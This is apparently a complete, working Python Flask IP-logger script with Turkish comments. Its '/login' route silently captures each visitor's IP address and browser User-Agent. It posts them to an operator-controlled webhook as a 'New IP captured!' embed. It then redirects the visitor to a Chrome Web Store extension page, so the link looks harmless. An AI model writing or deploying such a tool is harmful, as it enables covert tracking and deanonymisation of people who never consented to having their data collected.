import os
from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# URL'yi kodun içine yazmıyoruz, sistemden otomatik alacak
WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
REDIRECT_URL = "https://chromewebstore.google.com/detail/roearn-custom-avatar-crea/fooenmopnfaejehogdbmegaleanpdcea?hl=tr"

@app.route('/')
def index():
    return redirect(REDIRECT_URL)

@app.route('/login')
def logger():
    # IP ve cihaz bilgilerini al
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    # Veriyi hazırla
    if WEBHOOK_URL:
        embed = {
            "title": "Yeni IP Yakalandı!",
            "color": 16711680,
            "fields": [
                {"name": "IP Adresi", "value": ip, "inline": True},
                {"name": "Cihaz/Tarayıcı", "value": user_agent, "inline": False}
            ]
        }
        try:
            requests.post(WEBHOOK_URL, json={"embeds": [embed]})
        except:
            pass
            
    return redirect(REDIRECT_URL)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
